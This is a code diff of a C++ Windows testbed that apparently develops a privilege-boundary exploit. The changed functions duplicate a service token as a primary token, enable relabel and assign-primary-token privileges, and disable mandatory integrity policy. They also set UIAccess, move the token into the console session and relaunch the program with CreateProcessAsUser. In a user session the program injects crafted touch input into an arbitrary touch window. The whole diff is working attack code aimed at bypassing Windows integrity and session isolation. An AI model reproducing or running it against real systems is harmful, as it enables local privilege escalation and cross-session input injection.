@@ -40,10 +40,27 @@ DWORD __stdcall HandlerProc(DWORD dwControl, DWORD dwEventType, void* lpEventDat
 }
 
 void TestFireSingleTouchInput(void) {
-  DWORD rs;
+  __debugbreak();
+
+  // Identify an arbitrary touch window:
+  HWND hWnd = nullptr;
+  EnumWindows(
+    [] (HWND hWnd, LPARAM lParam) -> BOOL {
+      wchar_t text[0x20];
+      GetWindowText(hWnd, text, 0x20);
+
+      if(!IsTouchWindow(hWnd, 0))
+        return true;
+
+      *(HWND*)lParam = hWnd;
+      return false;
+    },
+    (LPARAM)&hWnd
+  );
+  if(!hWnd)
+    return;
 
   // Try to fire:
-  HWND hWnd = GetDesktopWindow();
   TouchData data;
   data.a1 = 0x00017609;
   data.a2 = 0x0000b7e5;
@@ -87,14 +104,12 @@ void EnableToken(HANDLE target, LPWSTR name) {
 /// Turns off mandatory policy on the current process token
 /// </summary>
 void DisableMIC(void) {
-  DWORD rs;
-
   // Enable certain required privileges:
   EnableToken(token, SE_RELABEL_NAME);
   EnableToken(token, SE_ASSIGNPRIMARYTOKEN_NAME);
 
   // Duplicate our token:
-  DuplicateTokenEx(token, TOKEN_ALL_ACCESS, nullptr, SecurityImpersonation, TokenImpersonation, &hImpersonation);
+  DuplicateTokenEx(token, TOKEN_ALL_ACCESS, nullptr, SecurityImpersonation, TokenPrimary, &hImpersonation);
 
   // Switch off mandatory policy:
   TOKEN_MANDATORY_POLICY policy;
@@ -105,6 +120,12 @@ void DisableMIC(void) {
   DWORD uiAccess = 1;
   SetTokenInformation(hImpersonation, TokenUIAccess, &uiAccess, sizeof(uiAccess));
 
+  __debugbreak();
+
+  // Token needs to be ported to the console desktop session:
+  DWORD tgtSession = WTSGetActiveConsoleSessionId();
+  SetTokenInformation(hImpersonation, TokenSessionId, &tgtSession, sizeof(tgtSession));
+
   // Obtain our own executable:
   auto self = GetSelfExecutable();
   STARTUPINFO startupinfo;
@@ -114,24 +135,41 @@ void DisableMIC(void) {
   // desktop in the interactive user's session in order to interact with _that_ version of win32k
   memset(&startupinfo, 0, sizeof(startupinfo));
   startupinfo.cb = sizeof(startupinfo);
-  startupinfo.lpDesktop = L"WinSta0\\Default";
 
   // Argument string is intentionally a stack-allocated array due to the constraints placed
   // by the CreateProcessWithToken call.  The argument _must_ be mutable.
   wchar_t arg[] = L"Testbed.exe -k";
 
-  // Try to regenerate with this new token:
-  auto val = CreateProcessWithTokenW(
-    hImpersonation,
-    0,
-    self.c_str(),
-    arg,
-    CREATE_NEW_PROCESS_GROUP,
-    nullptr,
-    nullptr,
-    &startupinfo,
-    &procinfo
-  );
+  // Try to regenerate with the fully formed token:
+  BOOL val;
+  
+  if(false)
+    val = CreateProcessWithTokenW(
+      hImpersonation,
+      0,
+      self.c_str(),
+      arg,
+      CREATE_NEW_PROCESS_GROUP,
+      nullptr,
+      nullptr,
+      &startupinfo,
+      &procinfo
+    );
+  else
+    val = CreateProcessAsUser(
+      hImpersonation,
+      self.c_str(),
+      arg,
+      nullptr,
+      nullptr,
+      false,
+      NORMAL_PRIORITY_CLASS,
+      nullptr,
+      nullptr,
+      &startupinfo,
+      &procinfo
+    );
+
   if(!val)
     // Process creation failed, short-circuit here
     return;
@@ -185,10 +223,10 @@ int main(int argc, char* argv[]) {
   DWORD sessionID;
   ProcessIdToSessionId(GetCurrentProcessId(), &sessionID);
   if(sessionID)
-    RunProxy();
+    TestFireSingleTouchInput();
   else {
     OutputDebugString(L"Test test\n");
-    StartServiceCtrlDispatcher(gc_table);
+    StartServiceCtrlDispatcher(gc_table); 
   }
 
   CloseHandle(token);
